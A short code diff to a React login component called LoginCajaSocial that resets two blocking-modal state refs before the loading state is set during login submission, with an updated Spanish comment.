@@ -569,7 +569,9 @@ export default function LoginCajaSocial() {
       return;
     }
 
-    // Se activa el loading
+    // Se activa el loading y se resetean referencias de bloqueo
+    modalBloqueoEstadoRef.current = null;
+    ignorarEstadoHastaCambioRef.current = null;
     setLoading(true);
 
     // Se inicializa la data a enviar
